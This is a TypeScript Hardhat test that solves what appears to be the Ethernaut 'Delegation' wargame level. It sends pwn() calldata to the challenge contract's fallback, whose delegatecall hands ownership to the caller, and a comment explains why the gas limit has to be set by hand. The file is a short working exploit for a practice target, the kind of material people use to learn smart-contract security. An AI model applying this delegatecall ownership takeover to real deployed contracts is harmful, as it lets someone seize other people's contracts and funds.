import { expect } from "chai";
import { Contract, Signer, Interface } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Delegation`);
  const challengeAddress = await createChallenge(
    `0x73379d8B82Fda494ee59555f333DF7D44483fD58`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  const delegateeAbi = ["function pwn()"];
  let iface = new Interface(delegateeAbi);
  const data = iface.encodeFunctionData(`pwn`, [])

  tx = await eoa.sendTransaction({
    from: await eoa.getAddress(),
    to: challenge.target,
    data,
    // estimating gas fails! because fallback does not revert when inner call fails
    // The catch about gas estimation is that the node will try out your tx
    // with different gas values, and return the lowest one for which your tx
    // doesn't fail. But it only looks at your tx, not at any of the internal call
    // it makes. This means that if the contract code you're calling has a
    // try/catch that causes it not to revert if an internal call does,
    // you can get a gas estimation that would be enough for the caller contract,
    // but not for the callee.
    // https://gist.github.com/spalladino/a349f0ca53dbb5fc3914243aaf7ea8c6
    gasLimit: 100000n,
  })

  // tx = await challenge.fallback({
  //   data,
  // })
  await tx.wait();
});

after(async () => {
  expect(await submitLevel(challenge.target), "level not solved").to.be.true;
});
